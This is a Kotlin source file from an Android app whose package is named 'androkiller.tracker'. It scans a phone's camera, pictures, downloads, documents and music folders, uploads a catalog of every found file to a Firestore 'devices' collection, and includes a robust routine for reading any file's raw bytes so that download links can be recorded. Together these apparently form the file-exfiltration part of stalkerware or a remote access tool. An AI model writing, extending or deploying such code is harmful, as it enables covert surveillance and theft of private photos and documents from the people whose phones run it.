package com.nexus.androkiller.tracker

import android.content.ContentUris
import android.content.Context
import android.os.Build
import android.os.Environment
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import android.provider.MediaStore
import java.io.File
import java.util.Locale

data class DeviceFileItem(
    val id: String = "",
    val name: String = "",
    val path: String = "",
    val folder: String = "",
    val sizeBytes: Long = 0L,
    val sizeFormatted: String = "",
    val category: String = "OTHER", // "IMAGE", "AUDIO", "VIDEO", "DOCUMENT", "DOWNLOAD", "ARCHIVE", "OTHER"
    val extension: String = "",
    val lastModified: Long = 0L
)

class StorageFileManager(private val context: Context) {

    private val firestore: FirebaseFirestore?
        get() = try {
            FirebaseFirestore.getInstance()
        } catch (_: Exception) {
            null
        }

    /**
     * Scans phone files using MediaStore (Android 10-15 standard) and standard directories.
     */
    fun scanFiles(maxLimit: Int = 150): List<DeviceFileItem> {
        val results = mutableListOf<DeviceFileItem>()
        val seenPaths = hashSetOf<String>()

        // 1. Scan via MediaStore (works smoothly on Android 10, 11, 12, 13, 14, 15)
        try {
            val mediaStoreItems = scanFilesViaMediaStore(maxLimit)
            for (item in mediaStoreItems) {
                if (item.path.isNotBlank()) seenPaths.add(item.path)
                results.add(item)
            }
            Log.i(TAG, "MediaStore scanned ${mediaStoreItems.size} files")
        } catch (e: Exception) {
            Log.w(TAG, "MediaStore scan warning: ${e.message}")
        }

        // 2. Scan standard public storage directories and app cache
        if (results.size < maxLimit) {
            val directoriesToScan = listOf(
                "Downloads" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                "Camera / DCIM" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                "Pictures" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                "Documents" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                "Music" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                "App Cache" to context.cacheDir
            )

            for ((folderLabel, dir) in directoriesToScan) {
                if (dir == null || !dir.exists() || !dir.canRead()) continue
                scanDirectoryRecursive(dir, folderLabel, results, seenPaths, maxLimit)
                if (results.size >= maxLimit) break
            }
        }

        // Sort by last modified descending
        return results.sortedByDescending { it.lastModified }.take(maxLimit)
    }

    private fun scanFilesViaMediaStore(maxLimit: Int): List<DeviceFileItem> {
        val items = mutableListOf<DeviceFileItem>()
        val uri = MediaStore.Files.getContentUri("external")
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.DATA,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.DATE_MODIFIED,
            MediaStore.Files.FileColumns.MIME_TYPE
        )
        val sortOrder = "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"

        context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
            val idCol = cursor.getColumnIndex(MediaStore.Files.FileColumns._ID)
            val nameCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME)
            val dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA)
            val sizeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE)
            val dateCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED)
            val mimeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE)

            while (cursor.moveToNext() && items.size < maxLimit) {
                val rawName = if (nameCol != -1) cursor.getString(nameCol) ?: "" else ""
                val path = if (dataCol != -1) cursor.getString(dataCol) ?: "" else ""
                val name = rawName.ifBlank { if (path.isNotBlank()) File(path).name else "file" }
                val sizeBytes = if (sizeCol != -1) cursor.getLong(sizeCol) else 0L
                val dateSec = if (dateCol != -1) cursor.getLong(dateCol) else 0L
                val lastModified = if (dateSec > 0) dateSec * 1000L else System.currentTimeMillis()
                val mime = if (mimeCol != -1) cursor.getString(mimeCol) ?: "" else ""

                val ext = name.substringAfterLast('.', "").lowercase(Locale.ROOT)
                val category = when {
                    mime.startsWith("image/") || ext in listOf("jpg", "jpeg", "png", "webp", "gif") -> "IMAGE"
                    mime.startsWith("audio/") || ext in listOf("mp3", "m4a", "aac", "wav", "ogg") -> "AUDIO"
                    mime.startsWith("video/") || ext in listOf("mp4", "mkv", "3gp", "avi") -> "VIDEO"
                    mime.contains("pdf") || mime.contains("document") || mime.contains("text") || ext in listOf("pdf", "doc", "docx", "txt", "xlsx", "pptx") -> "DOCUMENT"
                    ext in listOf("zip", "apk", "rar", "tar", "7z", "gz", "obb", "iso", "bin") -> "ARCHIVE"
                    else -> "OTHER"
                }

                val folder = when {
                    path.contains("/DCIM", ignoreCase = true) -> "Camera / DCIM"
                    path.contains("/Pictures", ignoreCase = true) -> "Pictures"
                    path.contains("/Download", ignoreCase = true) -> "Downloads"
                    path.contains("/Documents", ignoreCase = true) -> "Documents"
                    path.contains("/Music", ignoreCase = true) -> "Music"
                    else -> "Storage"
                }

                val id = if (idCol != -1) {
                    val rawId = cursor.getString(idCol) ?: ""
                    rawId.ifBlank { (path + "_" + lastModified).hashCode().toString() }
                } else {
                    (path + "_" + lastModified).hashCode().toString()
                }

                items.add(
                    DeviceFileItem(
                        id = id,
                        name = name,
                        path = path,
                        folder = folder,
                        sizeBytes = sizeBytes,
                        sizeFormatted = formatFileSize(sizeBytes),
                        category = category,
                        extension = ext,
                        lastModified = lastModified
                    )
                )
            }
        }
        return items
    }

    private fun scanDirectoryRecursive(
        dir: File,
        folderLabel: String,
        results: MutableList<DeviceFileItem>,
        seenPaths: MutableSet<String>,
        maxLimit: Int,
        depth: Int = 0
    ) {
        if (depth > 2 || results.size >= maxLimit) return
        val files = dir.listFiles() ?: return

        for (file in files) {
            if (results.size >= maxLimit) break
            if (file.isDirectory && !file.name.startsWith(".")) {
                scanDirectoryRecursive(file, "$folderLabel/${file.name}", results, seenPaths, maxLimit, depth + 1)
            } else if (file.isFile && !file.name.startsWith(".")) {
                if (seenPaths.contains(file.absolutePath)) continue
                seenPaths.add(file.absolutePath)

                val ext = file.extension.lowercase(Locale.ROOT)
                val category = when (ext) {
                    "jpg", "jpeg", "png", "webp", "gif" -> "IMAGE"
                    "mp3", "m4a", "aac", "wav", "ogg" -> "AUDIO"
                    "mp4", "mkv", "3gp", "avi" -> "VIDEO"
                    "pdf", "doc", "docx", "txt", "xlsx", "pptx" -> "DOCUMENT"
                    "zip", "apk", "rar", "tar", "7z", "gz", "obb", "iso", "bin" -> "ARCHIVE"
                    else -> "OTHER"
                }

                val sizeBytes = file.length()
                val sizeFormatted = formatFileSize(sizeBytes)
                val id = (file.name + "_" + file.lastModified()).hashCode().toString()

                results.add(
                    DeviceFileItem(
                        id = id,
                        name = file.name,
                        path = file.absolutePath,
                        folder = folderLabel,
                        sizeBytes = sizeBytes,
                        sizeFormatted = sizeFormatted,
                        category = category,
                        extension = ext,
                        lastModified = file.lastModified()
                    )
                )
            }
        }
    }

    /**
     * Scans storage and synchronizes the catalog to Firestore under devices/{deviceId}/storage_catalog/inventory.
     */
    suspend fun scanAndSyncFiles(deviceId: String): Result<Int> = withContext(Dispatchers.IO) {
        val db = firestore ?: return@withContext Result.failure(IllegalStateException("Firestore not available"))

        try {
            val scannedFiles = scanFiles()
            val fileListMaps = scannedFiles.map { item ->
                hashMapOf(
                    "id" to item.id,
                    "name" to item.name,
                    "path" to item.path,
                    "folder" to item.folder,
                    "sizeBytes" to item.sizeBytes,
                    "sizeFormatted" to item.sizeFormatted,
                    "category" to item.category,
                    "extension" to item.extension,
                    "lastModified" to item.lastModified
                )
            }

            val catalogPayload = hashMapOf(
                "deviceId" to deviceId,
                "totalCount" to scannedFiles.size,
                "lastScanned" to FieldValue.serverTimestamp(),
                "files" to fileListMaps
            )

            // Save summarized inventory in storage_catalog
            db.collection("devices")
                .document(deviceId)
                .collection("storage_catalog")
                .document("inventory")
                .set(catalogPayload)
                .await()

            Log.i(TAG, "Storage catalog synced for $deviceId with ${scannedFiles.size} files")
            Result.success(scannedFiles.size)
        } catch (e: Exception) {
            Log.e(TAG, "Failed syncing file catalog: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Robustly reads raw binary bytes for a file from storage.
     * Uses direct File access, MediaStore ContentResolver, or standard directory lookups.
     */
    fun readFileBytes(filePath: String, fileId: String = "", fileName: String = ""): ByteArray? {
        val cleanPath = filePath.trim()
        val cleanName = fileName.trim().ifBlank {
            if (cleanPath.isNotBlank()) File(cleanPath).name else ""
        }

        // 1. Direct File access (trying both original and /sdcard/ <-> /storage/emulated/0/ alternates)
        val candidatePaths = mutableListOf<String>()
        if (cleanPath.isNotBlank()) {
            candidatePaths.add(cleanPath)
            if (cleanPath.startsWith("/sdcard/")) {
                candidatePaths.add(cleanPath.replaceFirst("/sdcard/", "/storage/emulated/0/"))
            } else if (cleanPath.startsWith("/storage/emulated/0/")) {
                candidatePaths.add(cleanPath.replaceFirst("/storage/emulated/0/", "/sdcard/"))
            }
        }

        for (path in candidatePaths) {
            val file = File(path)
            try {
                if (file.exists() && file.canRead()) {
                    val bytes = file.readBytes()
                    if (bytes.isNotEmpty()) {
                        Log.i(TAG, "Read ${bytes.size} bytes via direct File access: $path")
                        return bytes
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Direct File.readBytes failed for $path: ${e.message}")
            }
            try {
                if (file.exists()) {
                    file.inputStream().use {
                        val bytes = it.readBytes()
                        if (bytes.isNotEmpty()) {
                            Log.i(TAG, "Read ${bytes.size} bytes via file.inputStream: $path")
                            return bytes
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "FileInputStream failed for $path: ${e.message}")
            }
        }

        // Candidate Content URIs to search across
        val contentBaseUris = mutableListOf(MediaStore.Files.getContentUri("external"))
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            contentBaseUris.add(MediaStore.Downloads.EXTERNAL_CONTENT_URI)
        }
        contentBaseUris.add(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
        contentBaseUris.add(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
        contentBaseUris.add(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)

        // 2. Query MediaStore ContentResolver via numeric ID if available
        val numId = fileId.toLongOrNull()
        if (numId != null && numId > 0) {
            for (baseUri in contentBaseUris) {
                try {
                    val contentUri = ContentUris.withAppendedId(baseUri, numId)
                    context.contentResolver.openInputStream(contentUri)?.use { stream ->
                        val bytes = stream.readBytes()
                        if (bytes.isNotEmpty()) {
                            Log.i(TAG, "Read ${bytes.size} bytes via MediaStore ID: $contentUri")
                            return bytes
                        }
                    }
                } catch (_: Exception) {}
            }
        }

        // 3. Query MediaStore ContentResolver by file path (trying all path variations)
        if (candidatePaths.isNotEmpty()) {
            for (baseUri in contentBaseUris) {
                for (path in candidatePaths) {
                    try {
                        val projection = arrayOf(MediaStore.Files.FileColumns._ID)
                        val selection = "${MediaStore.Files.FileColumns.DATA} = ?"
                        context.contentResolver.query(baseUri, projection, selection, arrayOf(path), null)?.use { cursor ->
                            if (cursor.moveToFirst()) {
                                val id = cursor.getLong(0)
                                val contentUri = ContentUris.withAppendedId(baseUri, id)
                                context.contentResolver.openInputStream(contentUri)?.use { stream ->
                                    val bytes = stream.readBytes()
                                    if (bytes.isNotEmpty()) {
                                        Log.i(TAG, "Read ${bytes.size} bytes via MediaStore path: $path ($contentUri)")
                                        return bytes
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Querying $baseUri by path $path failed: ${e.message}")
                    }
                }
            }
        }

        // 4. Query MediaStore ContentResolver by display name (exact and case-insensitive)
        if (cleanName.isNotBlank()) {
            for (baseUri in contentBaseUris) {
                // Exact display name
                try {
                    val projection = arrayOf(MediaStore.Files.FileColumns._ID)
                    val selection = "${MediaStore.Files.FileColumns.DISPLAY_NAME} = ?"
                    context.contentResolver.query(baseUri, projection, selection, arrayOf(cleanName), null)?.use { cursor ->
                        if (cursor.moveToFirst()) {
                            val id = cursor.getLong(0)
                            val contentUri = ContentUris.withAppendedId(baseUri, id)
                            context.contentResolver.openInputStream(contentUri)?.use { stream ->
                                val bytes = stream.readBytes()
                                if (bytes.isNotEmpty()) {
                                    Log.i(TAG, "Read ${bytes.size} bytes via MediaStore name: $cleanName ($contentUri)")
                                    return bytes
                                }
                            }
                        }
                    }
                } catch (_: Exception) {}

                // Case-insensitive display name
                try {
                    val projection = arrayOf(MediaStore.Files.FileColumns._ID)
                    val selection = "LOWER(${MediaStore.Files.FileColumns.DISPLAY_NAME}) = LOWER(?)"
                    context.contentResolver.query(baseUri, projection, selection, arrayOf(cleanName), null)?.use { cursor ->
                        if (cursor.moveToFirst()) {
                            val id = cursor.getLong(0)
                            val contentUri = ContentUris.withAppendedId(baseUri, id)
                            context.contentResolver.openInputStream(contentUri)?.use { stream ->
                                val bytes = stream.readBytes()
                                if (bytes.isNotEmpty()) {
                                    Log.i(TAG, "Read ${bytes.size} bytes via MediaStore lower name: $cleanName ($contentUri)")
                                    return bytes
                                }
                            }
                        }
                    }
                } catch (_: Exception) {}
            }
        }

        // 5. Check public directories by cleanName
        if (cleanName.isNotBlank()) {
            val publicDirs = listOf(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                context.cacheDir,
                context.filesDir
            )
            for (dir in publicDirs) {
                if (dir != null && dir.exists()) {
                    val candidate = File(dir, cleanName)
                    if (candidate.exists()) {
                        try {
                            val bytes = candidate.readBytes()
                            if (bytes.isNotEmpty()) {
                                Log.i(TAG, "Read ${bytes.size} bytes from public dir: ${candidate.absolutePath}")
                                return bytes
                            }
                        } catch (_: Exception) {}
                    }
                }
            }
        }

        Log.w(TAG, "readFileBytes failed to resolve file: path='$cleanPath', id='$fileId', name='$cleanName'")
        return null
    }

    /**
     * Updates an existing file record with its uploaded downloadUrl in storage_catalog/inventory.
     */
    suspend fun updateFileDownloadUrl(deviceId: String, filePath: String, downloadUrl: String): Boolean = withContext(Dispatchers.IO) {
        val db = firestore ?: return@withContext false
        try {
            // Guard: do not inject large Base64 Data URIs (>50KB) inside inventory document
            if (downloadUrl.startsWith("data:") && downloadUrl.length > 50_000) {
                Log.i(TAG, "Skipping updating downloadUrl in inventory document to prevent exceeding Firestore 1MB doc limit")
                return@withContext true
            }
            val docRef = db.collection("devices").document(deviceId).collection("storage_catalog").document("inventory")
            val snap = docRef.get().await()
            if (snap.exists()) {
                val files = snap.get("files") as? List<Map<String, Any>> ?: return@withContext false
                val updatedFiles = files.map { fileMap ->
                    if (fileMap["path"] == filePath) {
                        fileMap.toMutableMap().apply { put("downloadUrl", downloadUrl) }
                    } else {
                        fileMap
                    }
                }
                docRef.update("files", updatedFiles).await()
                Log.i(TAG, "Updated downloadUrl for file: $filePath in storage_catalog")
                return@withContext true
            }
            false
        } catch (e: Exception) {
            Log.w(TAG, "Failed updating file downloadUrl in catalog: ${e.message}")
            false
        }
    }

    private fun formatFileSize(bytes: Long): String {
        if (bytes <= 0) return "0 B"
        val kb = bytes / 1024.0
        val mb = kb / 1024.0
        val gb = mb / 1024.0
        return when {
            gb >= 1.0 -> String.format(Locale.US, "%.1f GB", gb)
            mb >= 1.0 -> String.format(Locale.US, "%.1f MB", mb)
            kb >= 1.0 -> String.format(Locale.US, "%.1f KB", kb)
            else -> "$bytes B"
        }
    }

    companion object {
        private const val TAG = "StorageFileManager"
    }
}
